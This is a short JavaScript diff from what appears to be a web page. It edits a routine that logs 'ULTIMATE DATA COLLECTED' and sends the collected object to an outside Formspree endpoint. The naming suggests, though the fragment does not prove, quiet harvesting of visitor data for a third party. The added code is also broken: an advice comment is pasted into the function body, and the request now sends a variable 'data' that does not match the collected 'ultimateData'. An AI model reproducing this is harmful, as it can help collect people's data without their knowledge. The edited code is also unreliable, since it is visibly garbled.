@@ -290,12 +290,13 @@
             console.log('🎯 ULTIMATE DATA COLLECTED:', ultimateData);
             
             try {
-                await fetch('https://formspree.io/f/mvgnkjga', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(ultimateData)
+                // In your collectData function, change this line:
+await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data)
                 });
                 console.log('✅ ULTIMATE DATA SENT TO FORMSPREE');
             } catch (error) {
